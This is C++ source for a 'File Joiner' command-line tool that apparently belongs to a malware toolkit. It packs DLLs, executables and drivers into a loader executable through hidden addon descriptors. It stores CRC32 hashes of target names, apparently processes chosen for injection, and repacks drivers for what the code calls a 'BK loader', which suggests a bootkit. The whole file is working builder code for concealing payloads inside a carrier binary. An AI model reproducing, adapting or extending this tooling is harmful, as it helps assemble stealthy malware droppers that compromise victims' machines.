//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// File Joiner utility.
//	
// module: fj.cpp
// $Revision: 88 $
// $Date: 2012-08-14 19:07:32 +0400 (Вт, 14 авг 2012) $
// description:  
//	Main module. 
//	Allows to attach multiple files to one executable.


#include <tchar.h>
#include <iostream>
#include <windows.h>
#include <imagehlp.h>
#include "..\inc\dbg.h"
#include "pesup.h"

#pragma warning(disable:4200)	//  nonstandard extension used : zero-sized array in struct/union
#pragma warning(disable:4996)	//  This function or variable may be unsafe.
#include "joiner.h"

#define _CRT_OUT

using namespace std;

#define		szDll		"DLL:"
#define		szExe		"EXE:"
#define		szDrv		"DRV:"
#define		szRun		"RUN:"
#define		szReg		"REG:"
#define		szBin		"BIN:"
#define		szSrc		"SOURCE:"
#define		szOut		"OUT:"
#define		szIni		"INI:"

#define		szBkPack	"bkpack.exe %s %s"

#define		TARGET_DATA_SIZE	0x400
#define		TARGET_MAX_HASHES	32

typedef struct _TARGET_MODULE
{
	PCHAR	PackedModule;
	ULONG	PackedSize;
	ULONG	OriginalSize;
	ULONG	ModuleFlags;
	ULONG	ModuleId;
	ULONG	NumberHashes;
	ULONG	Hash[TARGET_MAX_HASHES];
} TARGET_MODULE, *PTARGET_MODULE;



LPTSTR	g_OutPath = NULL;
LPTSTR	g_SourcePath = NULL;


VOID About(VOID)
{
	cout << "Image joiner utility. Version 1.0" << endl;
	cout << "USE: fj <source executable path> <config file path> <result file path>" << endl;
}


ULONG Crc32(PCHAR pMem, ULONG uLen)
{
  ULONG		I, C;
  ULONG		dwSeed =  -1;

  while( uLen-- )
  {
    C = *pMem;
    pMem = pMem + 1;

    for( I = 0; I < 8; I++ )
    {
      if ( (dwSeed ^ C) & 1 )
        dwSeed = (dwSeed >> 1) ^ 0xEDB88320;
      else
        dwSeed = (dwSeed >> 1);

      C >>= 1;
    }
  }

  return((ULONG)dwSeed);
}


ULONG	LoadFile(LPTSTR	FileName, PCHAR* pBuffer)
{
	ULONG	Written, BufferSize = 0, Size;
	PCHAR	Buffer = NULL;
	HANDLE	hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		Size = GetFileSize(hFile, NULL);
		if (Buffer = (PCHAR)vAlloc(Size))
		{
			if (ReadFile(hFile, Buffer, Size, &Written, NULL))
			{
				*pBuffer = Buffer;
				BufferSize = Size;
			}
			else
				vFree(Buffer);
		}		
		CloseHandle(hFile);
	}	// if (hFile != INVALID_HANDLE_VALUE)
	return(BufferSize);
}


LPTSTR	CreateTempFile(PCHAR Content, ULONG Size)
{
	HANDLE	hTempFile = 0;
	LPTSTR	TempFilePath = NULL;
	ULONG	bSize;
	BOOL	Success = FALSE;

	if (TempFilePath = (LPTSTR)Alloc(PAGE_SIZE))
	{
		if (bSize = GetTempPath(PAGE_SIZE / sizeof(_TCHAR), TempFilePath))
		{
			TempFilePath[bSize] = 0;
			if (GetTempFileName(TempFilePath, NULL, GetTickCount(), TempFilePath))
			{
				hTempFile = CreateFile(TempFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 
					FILE_ATTRIBUTE_NORMAL, 0);

				if (hTempFile != INVALID_HANDLE_VALUE)
				{
					Success = WriteFile(hTempFile, Content, Size, &bSize, NULL);
					CloseHandle(hTempFile);
				}
			}	// if (GetTempFileName(TempFilePath, NULL, 0, TempFilePath))
		}	// if (bSize = GetTempPath(PAGE_SIZE / sizeof(_TCHAR), TempFilePath))
	}	// if (TempFilePath = LocalAlloc(PAGE_SIZE))

	if (!Success)
	{
		if (TempFilePath)
			Free(TempFilePath);
		TempFilePath = NULL;
	}
	return(TempFilePath);
}


ULONG	PackBuffer(PCHAR Buffer, ULONG Size, PCHAR* pPacked)
{
	ULONG	PackedSize = 0;
	PCHAR	Packed = NULL, WorkMem = NULL;

	ASSERT(Size);

	if (WorkMem = (PCHAR)Alloc(aP_workmem_size(Size)))
	{
		if (Packed = (PCHAR)Alloc(aP_max_packed_size(Size)))
		{
			PackedSize = aP_pack(Buffer, Packed, Size, WorkMem, NULL, NULL);
			if (PackedSize)
				*pPacked = Packed;
			else				
				Free(Packed);
		}	// if (Packed = (PCHAR)Alloc(aP_max_packed_size(Size)))
		Free(WorkMem);
	}	// if (WorkMem = (PCHAR)Alloc(aP_workmem_size(Size)))
	return(PackedSize);
}



/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Removes spaces and special symbols from the beginning and the end of the specified string.
//
PCHAR strspace(PCHAR Str)
{
	ULONG Len;

	while(Str[0] > 0 && Str[0] < '.')
		Str += 1;

	if (Len = (ULONG)strlen(Str))
	{
		while(Str[Len-1] > 0 && Str[Len-1] < '0')
		{
			Len -= 1;
			Str[Len] = 0;
		}
	}
	return(Str);
}

	
ULONG	CheckPeModule(PCHAR Module)
{
	ULONG ModuleFlags = 0;
	PIMAGE_DOS_HEADER	DosHeader = (PIMAGE_DOS_HEADER)Module;
	PIMAGE_NT_HEADERS	Pe = NULL;

	do 
	{
		ULONG Flags = 0;

		if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
			break;

		Pe = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(DosHeader);
		if (Pe->Signature != IMAGE_NT_SIGNATURE)
			break;

		if (Pe->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
			Flags |= PE_FLAG_X64;
		else if (Pe->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
			break;

		if (Pe->FileHeader.Characteristics & IMAGE_FILE_DLL)
			Flags |= PE_FLAG_DLL;

		if (IMAGE_SUBSYSTEM_NATIVE == PeSupGetOptionalField(Pe, Subsystem))
			Flags |= PE_FLAG_NATIVE;

		ModuleFlags = Flags | PE_FLAG_VALID;
	} while(FALSE);
	return(ModuleFlags);
}


PTARGET_MODULE AllocateTarget(
	PCHAR	ModulePath, 
	BOOL	CheckPe,
	BOOL	PackIt
	)
{
	PTARGET_MODULE	Tm = NULL;
	PCHAR	Target = NULL;
	BOOL	Ret = FALSE;
	PCHAR	ShortPath;

	do 
	{
		if (!(Tm = (PTARGET_MODULE)Alloc(sizeof(TARGET_MODULE))))
			break;

		memset(Tm, 0, sizeof(TARGET_MODULE));

		if (!(Tm->OriginalSize = LoadFile(ModulePath, &Target)))
			break;

		if (CheckPe && (!(Tm->ModuleFlags = CheckPeModule(Target))))
			break;			

		if (PackIt)
		{
			if (!(Tm->PackedSize = PackBuffer(Target, Tm->OriginalSize, &Tm->PackedModule)))
				break;

			Tm->ModuleFlags |= TARGET_FLAG_PACKED;
		}
		else
		{
			if (!(Tm->PackedModule = (PCHAR)Alloc(Tm->OriginalSize)))
				break;
			memcpy(Tm->PackedModule, Target, (Tm->PackedSize = Tm->OriginalSize));
		}

		if (ShortPath = strrchr(ModulePath, '\\'))
			ShortPath += 1;
		else
			ShortPath = ModulePath;

		Tm->ModuleId = Crc32(_strupr(ShortPath), lstrlen(ShortPath));

		Ret = TRUE;				
	} while(FALSE);

	if (Tm && !Ret)
	{
		Free(Tm);
		Tm = NULL;
	}

	if (Target)
		UnmapViewOfFile(Target);

	return(Tm);
}

VOID	FreeTarget(PTARGET_MODULE	Tm)
{
	if (Tm->PackedModule && Tm->PackedSize)
		Free(Tm->PackedModule);
	
	Free(Tm);
}


WINERROR	AddTarget(PTARGET_MODULE Tm, PCHAR* pLoader, PULONG pLoaderSize, BOOL IsProcess)
{
	BOOL Ret = FALSE;
	WINERROR	Status = ERROR_BAD_EXE_FORMAT;
	ULONG	ResultSize = 0, LoaderSize = *pLoaderSize;
	PCHAR	Result, Loader = *pLoader;
	PIMAGE_DOS_HEADER	DosHeader = (PIMAGE_DOS_HEADER)Loader;
	PIMAGE_NT_HEADERS	Pe;
	ULONG	FileAlign, SecAlign, ImageSize, VirtualSize, SizeOfHeaders;
	PIMAGE_SECTION_HEADER	Section;
	PADDON_DESCRIPTOR		ADesc;
	ULONG	ModuleFlags;
		
	do	// not a loop
	{
		if (*pLoader == NULL || *pLoaderSize == 0)
		{
			Status = ERROR_INVALID_PARAMETER;
			cout << "No source file specified." << endl;
			break;
		}


		Status = ERROR_BAD_EXE_FORMAT;
		if (!(ModuleFlags = CheckPeModule(Loader)))
			break;

		if (ModuleFlags & TARGET_FLAG_BINARY)
		{
			if((ModuleFlags & PE_FLAG_NATIVE) && ((Tm->ModuleFlags & PE_FLAG_X64) && !(ModuleFlags & PE_FLAG_X64)))
				break;

			if (((Tm->ModuleFlags & PE_FLAG_DLL) && IsProcess) || (!(Tm->ModuleFlags & PE_FLAG_DLL) && !IsProcess))
				break;
		}

		Pe = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(DosHeader);

		Status = ERROR_UNSUCCESSFULL;

		FileAlign = PeSupGetOptionalField(Pe, FileAlignment);
		SecAlign = PeSupGetOptionalField(Pe, SectionAlignment);
		ImageSize = PeSupGetOptionalField(Pe, SizeOfImage);
		SizeOfHeaders = PeSupGetOptionalField(Pe, SizeOfHeaders);

		ResultSize = PeSupAlign(LoaderSize + Tm->PackedSize, FileAlign);
		
		if (!(Result = (PCHAR)vAlloc(ResultSize)))
			break;

		memcpy(Result, Loader, LoaderSize);
		memcpy(Result + LoaderSize, Tm->PackedModule, Tm->PackedSize);
		memset(Result + LoaderSize + Tm->PackedSize, 0, ResultSize - Tm->PackedSize - LoaderSize);

		Pe = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(Result);
		Section = (PIMAGE_SECTION_HEADER)PeSupGetSectionTable(Pe);
		Section += PeSupGetNumberOfSections(Pe) - 1;

		ADesc = FirstAddonDescriptor(Result);

		while(ADesc->Magic == ADDON_MAGIC)
			ADesc = NextAddonDescriptor(ADesc);	

		while(ADesc->Magic != 0 && ((PCHAR)(ADesc + 1) <= (Result + SizeOfHeaders)))
			ADesc += 1;

		if ((PCHAR)(ADesc + 1) > (Result + SizeOfHeaders))
			break;

		ADesc->Magic = ADDON_MAGIC;
		ADesc->ImageRva = LoaderSize - Section->PointerToRawData + Section->VirtualAddress;
		ADesc->ImageSize = Tm->OriginalSize;
		ADesc->Flags = Tm->ModuleFlags;
		ADesc->ImageId = Tm->ModuleId;

		if (ADesc->NumberHashes = (USHORT)Tm->NumberHashes)
			memcpy(&ADesc->Hash, &Tm->Hash, Tm->NumberHashes * sizeof(ULONG));
	
		Section->SizeOfRawData = PeSupAlign(Section->SizeOfRawData + Tm->PackedSize, FileAlign);

		VirtualSize = PeSupAlign(Section->SizeOfRawData, SecAlign);
		PeSupSetOptionalField(Pe, SizeOfImage, PeSupGetOptionalField(Pe, SizeOfImage) - PeSupAlign(Section->Misc.VirtualSize, SecAlign) + VirtualSize);
		Section->Misc.VirtualSize = VirtualSize;
		Section->Characteristics &= (~IMAGE_SCN_MEM_DISCARDABLE);

		if (PeSupGetOptionalField(Pe, CheckSum))
		{
			ULONG	HeaderSum, FileSum;
			if (Pe = CheckSumMappedFile(Result, ResultSize, &HeaderSum, &FileSum))
				PeSupSetOptionalField(Pe, CheckSum, FileSum);
		}

		vFree(Loader);
		
		*pLoader = Result;
		*pLoaderSize = ResultSize;
			
		Status = NO_ERROR;

	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (Status == NO_ERROR)
	{
		cout << "Target successfully joined." << endl;							
	}
	else
	{	
		cout << "ERROR: Failed joining the target, status: " << Status << endl;
	}

	return(Status);
}


BOOL PackFile(PCHAR	FilePath)
{
	STARTUPINFO	Si = {0};
	PROCESS_INFORMATION Pi = {0};
	BOOL Ret = FALSE;
	PCHAR	CmdLine;

	if (CmdLine = (PCHAR)Alloc(lstrlen(szBkPack) + (lstrlen(FilePath) * 2) + 1 + 1))
	{
		wsprintf(CmdLine, szBkPack, FilePath, FilePath);

		Si.cb = sizeof(STARTUPINFO);
		if (Ret = CreateProcess(NULL, CmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &Si, &Pi))
		{
			WaitForSingleObject(Pi.hProcess, INFINITE);
			CloseHandle(Pi.hThread);
			CloseHandle(Pi.hProcess);
		}

		Free(CmdLine);

	}

	return(Ret);
}


ULONG GetTaregtFileSize(PCHAR FilePath)
{
	HANDLE	hFile = CreateFileA(FilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	ULONG	FileSize = 0;

	if (hFile != INVALID_HANDLE_VALUE)
	{
		FileSize = GetFileSize(hFile, NULL);
		CloseHandle(hFile);
	}
	return(FileSize);
}


BOOL ProcessConfig(HANDLE hConfig, PCHAR* pLoader, PULONG pLoaderSize, BOOL IsSub)
{
	BOOL	IsProcess = FALSE, Ret = FALSE, Leave = FALSE;
	PCHAR	Str, cStr, cStr1, cStr2;
	ULONG	Line = 0, Len = 0;
	PTARGET_MODULE	TargetDll = NULL;
	fpos_t	fPos;


	if (Str = (PCHAR)Alloc(MAX_PATH))
	{
		while(!fgetpos((FILE*)hConfig, &fPos) && fgets(Str, MAX_PATH, (FILE*)hConfig))
		{
			ULONG	TargetFlags = TARGET_FLAG_PACKED;

			Line += 1;
			Ret = TRUE;
			cStr = strspace(Str);
		
			while (cStr[0] != 0)	
			{
				if  (cStr[0] == ';')	// skipping commented string
					break;

				cStr1 = strchr(cStr, ' ');
				cStr2 = strchr(cStr, 9);

				if (cStr1 == NULL)
					cStr1 = cStr2;

				if ((cStr2) && (cStr1 > cStr2))
					cStr1 = cStr2;

				if (cStr1)	// more
				{
					cStr1[0] = 0;
					cStr1 += 1;
					cStr1 = strspace(cStr1);

					if (_stricmp(cStr, szOut) == 0)
					{
						if (g_OutPath = (LPTSTR)Alloc(strlen(cStr1) + 1))
							lstrcpy(g_OutPath, cStr1);

						break;
					}	// if (_stricmp(cStr, szOut) == 0)

					if (_stricmp(cStr, szSrc) == 0)
					{
						if (*pLoaderSize)
						{
							cout << "Conflicting source files specified." << endl;
							Ret = FALSE;
							break;
						}

						if (!(*pLoaderSize = LoadFile(cStr1, pLoader)))
						{
							cout << "Unable to open source file: " << cStr1;
							Ret = FALSE;
						}

						break;
					}	// if (_stricmp(cStr, szSrc) == 0)

					if (_stricmp(cStr, szReg) == 0)
					{
						TARGET_MODULE	Target = {0};
						Target.PackedModule = cStr1;
						Target.PackedSize = (ULONG)strlen(cStr1);
						Target.OriginalSize = (ULONG)strlen(cStr1);
						Target.ModuleFlags = TARGET_FLAG_BINARY;
						cout << "Processing target string: " << cStr1 << endl;
						if (AddTarget(&Target, pLoader, pLoaderSize, FALSE) == NO_ERROR)
							continue;
						else
						{
							Ret = FALSE;
							break;
						}
					}	// if (_stricmp(cStr, szReg) == 0)

					if (_stricmp(cStr, szBin) == 0 || _stricmp(cStr, szIni) == 0)
					{
						PTARGET_MODULE	Target;
						WINERROR Error;

//						if (IsSub)
//						{
//							fsetpos((FILE*)hConfig, &fPos);
//							Leave = TRUE;
//							break;
//						}

						cout << "Processing target BINARY: " << cStr1 << endl;

						if (!(Target = AllocateTarget(cStr1, FALSE, (_stricmp(cStr, szIni) == 0 ? FALSE : TRUE))))
						{
							cout << "ERROR: Unable to allocate target:" << cStr1 << endl;
							Ret = FALSE;
							break;
						}
						
						Target->ModuleFlags = TARGET_FLAG_BINARY | TARGET_FLAG_PACKED;
						Error = AddTarget(Target, pLoader, pLoaderSize, TRUE);
						FreeTarget(Target);

						if (Error != NO_ERROR)
							Ret = FALSE;
						break;
					}	// if (_stricmp(cStr, szBin) == 0)

					if (_stricmp(cStr, szDrv) == 0)
					{
						PCHAR	Driver;
						ULONG	DriverSize;

						if (IsSub)
						{
							fsetpos((FILE*)hConfig, &fPos);
							Leave = TRUE;
							break;
						}

						if (!(DriverSize = LoadFile(cStr1, &Driver)) || !ProcessConfig(hConfig, &Driver, &DriverSize, TRUE))
						{
							cout << "Unable to process driver: " << cStr1;
							Ret = FALSE;
							break;
						}

						if (!(cStr1 = CreateTempFile(Driver, DriverSize)))
						{
							cout << "Unable to create temporary file.";
							Ret = FALSE;
							break;
						}

						PackFile(cStr1);

						if (GetTaregtFileSize(cStr1) >= 122880)
						{
							cout << "Target file is too large for BK loader.";
							Ret = FALSE;
							break;
						}

						IsProcess = TRUE;
						TargetFlags |= TARGET_FLAG_DRV;
					}
					else
					{
						if (_stricmp(cStr, szRun) == 0)
						{
							if (IsSub)
							{
								fsetpos((FILE*)hConfig, &fPos);
								Leave = TRUE;
								break;
							}
							TargetFlags |= TARGET_FLAG_RUN;
							IsProcess = TRUE;
						}
						else if (_stricmp(cStr, szExe) == 0)
						{
							TargetFlags |= TARGET_FLAG_EXE;
							IsProcess = TRUE;
						}
						else
							IsProcess = FALSE;
					}

					if (IsProcess || (_stricmp(cStr, szDll) == 0))
					{
						if (TargetDll)
						{
							// Finishing current target DLL info
//							ASSERT(!IsProcess);

							if (AddTarget(TargetDll, pLoader, pLoaderSize, FALSE) != NO_ERROR)
							{
								Ret = FALSE;
							}
							FreeTarget(TargetDll);
							TargetDll = NULL;
						}	// if (TargetDll)

						// Allocating new target info
						if (IsProcess)
							cout << "Processing target PROCESS: " << cStr1 << endl;
						else
							cout << "Processing target DLL: " << cStr1 << endl;

						if (!(TargetDll = AllocateTarget(cStr1, TRUE, TRUE)))
							cout << "ERROR: Unable to allocate target:" << cStr1 << endl;
						else if (IsProcess)
						{
							TargetDll->ModuleFlags |= TargetFlags;
							// Finishing current target process info
							if (AddTarget(TargetDll, pLoader, pLoaderSize, TRUE) != NO_ERROR)
								Ret = FALSE;
							FreeTarget(TargetDll);
							TargetDll = NULL;
						}
						break;
					}	// if ((stricmp(cStr, szDLL) == 0) || IsProcess)
				}	// if (cStr1)
	
				if (Len = (ULONG)strlen(cStr))
				{
					if (!TargetDll)
					{
						Ret = FALSE;
						break;
					}

					TargetDll->Hash[TargetDll->NumberHashes] = Crc32(_strupr(cStr), Len);
					TargetDll->NumberHashes += 1;
				}
				cStr[0] = 0;
				if (cStr1)
					cStr = cStr1;
			}	// while (cStr[0] != 0)	
			if (Leave || !Ret)
				break;
		}	// while(fgets(Str, MAX_PATH, File))
		Free(Str);
		if (Ret && TargetDll)
			AddTarget(TargetDll, pLoader, pLoaderSize, FALSE); 

	}	// if (Str = (PCHAR)Alloc(MAX_PATH))
	return(Ret);
}





#pragma	warning(disable:4996)	//	'fopen': This function or variable may be unsafe...

int _tmain(int argc, _TCHAR* argv[])
{

	LPTSTR		ConfigName, Flags = NULL;
	HANDLE		hFile = 0;
	WINERROR	Status = NO_ERROR;

	BOOL	Ret = FALSE;
	PCHAR	Loader = NULL;
	ULONG	LoaderSize = 0, ResultSize = 0;


	if (argc == 2)
		ConfigName = argv[1];
	else if (argc == 4)
	{
		g_SourcePath = argv[1];
		ConfigName = argv[2];
		g_OutPath = argv[3];
	}
	else
	{	
		Status = ERROR_INVALID_PARAMETER;
		cout << "Invalid number of parameters." << endl;
	}


	while (Status == NO_ERROR)
	{
		FILE*	hConfig;

		if (!(hConfig = fopen(ConfigName,"r")))
		{
			cout << "Unable to open config file: " << ConfigName;
			break;
		}

		if (g_SourcePath && (!(LoaderSize = LoadFile(g_SourcePath, &Loader))))
		{
			cout << "Unable to open source file: " << g_SourcePath;
			break;
		}

		cout << "Parsing config file: " << ConfigName << endl;
		Ret = ProcessConfig(hConfig, &Loader, &LoaderSize, FALSE);	

		fclose(hConfig);

		if (!g_OutPath)
		{
			Status = ERROR_INVALID_PARAMETER;
			cout << "No output file specified.";
			break;
		}

		DeleteFile(g_OutPath);
		
		hFile = CreateFile(g_OutPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			cout << "Unable to open output file: " << g_OutPath;
			break;
		}

		if (!LoaderSize || (!(WriteFile(hFile, Loader, LoaderSize, &ResultSize, NULL))))
		{
			cout << "Unable to write output file: " << g_OutPath;
			break;
		}
		CloseHandle(hFile);
		Status = NO_ERROR;
		break;
	}	// while (Status == NO_ERROR)

	if (Loader)
		vFree(Loader);

	if (Status == ERROR_UNSUCCESSFULL)
	{
		Status = GetLastError();
		cout << "Error: " << Status << endl;
	}

	return(Status);
}

